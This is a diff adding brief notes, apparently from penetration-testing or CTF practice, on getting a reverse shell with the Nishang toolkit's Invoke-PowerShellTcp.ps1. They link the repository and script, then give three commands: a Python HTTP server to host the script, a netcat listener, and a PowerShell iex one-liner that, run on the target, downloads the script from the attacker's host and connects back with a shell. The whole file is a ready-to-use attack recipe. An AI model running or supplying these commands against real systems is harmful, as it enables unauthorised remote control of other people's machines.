@@ -1,0 +1,18 @@
+
+	## Github repo
+	https://github.com/samratashok/nishang
+
+	## Reverse shell code
+	https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+	## Create a reverse sehll
+
+		## Download code into local machine and expose de Invoke-PowerShellTcp.ps1 file
+		- python3 -m http.server --cgi [server-port]
+
+		## Configure listerner
+		- nc -lvnp [listerner-port]
+
+		## In the target machine execcute
+		- powershell iex (New-Object Net.WebClient).DownloadString('http://[your-ip]:[server-port]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [your-ip] -Port [listerner-port]
+	 
